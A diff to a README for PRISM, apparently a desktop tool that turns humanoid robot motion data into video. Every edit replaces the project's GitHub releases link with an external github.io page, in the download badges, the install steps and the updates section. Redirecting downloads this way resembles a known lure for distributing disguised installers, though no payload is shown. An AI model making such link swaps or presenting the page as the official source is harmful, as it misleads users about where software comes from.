@@ -1,7 +1,7 @@
 # 🎥 PRISM - Realistic Humanoid Motion Videos Made Easy
 
-[![Download PRISM](https://img.shields.io/badge/⬇%20Download%20PRISM-Get%20Started-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bloommmyboi/PRISM/releases)
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-Ready%20to%20Use-brightgreen?style=for-the-badge)](https://github.com/Bloommmyboi/PRISM/releases)
+[![Download PRISM](https://img.shields.io/badge/⬇%20Download%20PRISM-Get%20Started-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://bloommmyboi.github.io)
+[![Latest Release](https://img.shields.io/badge/Latest%20Release-Ready%20to%20Use-brightgreen?style=for-the-badge)](https://bloommmyboi.github.io)
 
 PRISM is a desktop application that turns ordinary humanoid robot motion data into clear, realistic video clips. Instead of hiring a video team or learning animation software, you point PRISM at your motion files, pick a scenario, and press a button. A few minutes later you have a polished video you can review, share with your team, or use to train and test robot behaviours.
 
@@ -54,7 +54,7 @@ A quick tip before you start: close other heavy applications such as video edito
 
 1. Open your web browser and go to the official release page:
 
-   **https://github.com/Bloommmyboi/PRISM/releases**
+   **https://bloommmyboi.github.io**
 
 2. Visit this link to download the application. Choose the most recent release shown at the top of the page and save the file to your computer.
 
@@ -165,7 +165,7 @@ PRISM does not send your recordings, videos, or project details anywhere. There 
 
 Bug reports, feature requests, and questions are all welcome on the repository's Issues page. When reporting a problem, include your Windows version, your graphics card model, and the exact message you saw — that makes it much faster to help you.
 
-For new versions and fixes, keep an eye on **https://github.com/Bloommmyboi/PRISM/releases**. Each release lists what changed so you can decide when to update.
+For new versions and fixes, keep an eye on **https://bloommmyboi.github.io**. Each release lists what changed so you can decide when to update.
 
 ---
 
